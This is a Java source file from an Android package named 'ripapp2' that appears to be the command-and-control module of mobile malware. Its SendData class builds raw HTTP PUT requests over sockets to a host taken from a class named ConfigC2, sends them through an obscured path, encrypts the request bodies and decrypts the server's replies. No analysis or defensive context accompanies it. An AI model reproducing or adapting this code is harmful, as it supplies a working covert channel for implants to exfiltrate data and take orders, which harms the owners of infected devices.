package com.example.ripapp2;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;
import java.util.ArrayList;
import org.json.JSONObject;

public class SendData {
    public static JSONObject send(Integer num) {
        return send("/fsalke2j9sdfcjlz/" + ConfigC2.urllist.get(num.intValue()));
    }

    public static JSONObject send(Integer num, String str) throws Exception {
        return send("/fsalke2j9sdfcjlz/" + ConfigC2.urllist.get(num.intValue()), str);
    }

    public static JSONObject send(String str) { // PATH 
        ArrayList<String> arrayList = ConfigC2.head;
        // PUT PATH HTTP/1.1
        return sock(BuildConfig.HOST, BuildConfig.PORT, arrayList.get(0)/*PUT*/ + str + arrayList.get(1) /*HTTP/1.1*/+ BuildConfig.HOST + arrayList.get(2) /* Connection: close */);
    }

    public static JSONObject send(String str, String str2) throws Exception {
        ArrayList<String> arrayList = ConfigC2.head;
        ArrayList<String> arrayList2 = ConfigC2.body;

        /* Rc8AAnDk0myfDAK9QU5aNk2gWG1Tfx + str + yWHUOv7if1lqbMCMKfYBOrHS8yrTIA */
        String encrypt = EncData.encrypt(arrayList2.get(2) + str2 + arrayList2.get(3));
                
        return sock(BuildConfig.HOST, BuildConfig.PORT, 
                arrayList.get(0) + str + arrayList.get(1) 
                + BuildConfig.HOST 
                + arrayList2.get(0) /* FAHoezFX3Beuxz46nuZDJSJHxa1XC0 */
                + arrayList2.get(1) /* yQOIIWf3PzTrvh0NdUByunaZZCGTYA */ + encrypt.length() 
                + arrayList.get(2)  /* Connection: close */ + encrypt);
    }

    public static JSONObject sock(final String str, final String str2, final String str3) {
        final JSONObject[] jSONObjectArr = {null};
        Thread thread = new Thread(new Runnable() {
            public void run() {
                try {
                    StringBuilder sb = new StringBuilder();
                    Socket socket = new Socket(str, Integer.parseInt(str2));
                    OutputStream outputStream = socket.getOutputStream();
                    outputStream.write(str3.getBytes());
                    outputStream.flush();
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                    while (true) {
                        String readLine = bufferedReader.readLine();
                        if (readLine != null) {
                            sb.append(readLine).append("\n");
                        } else {
                            String sb2 = sb.toString();
                            jSONObjectArr[0] = new JSONObject(EncData.decrypt(sb2.substring(sb2.indexOf("\n\n") + 2).trim()));
                            bufferedReader.close();
                            outputStream.close();
                            socket.close();
                            return;
                        }
                    }
                } catch (Exception e) {
                    System.err.println(e);
                }
            }
        });
        thread.start();
        try {
            thread.join();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        return jSONObjectArr[0];
    }
}
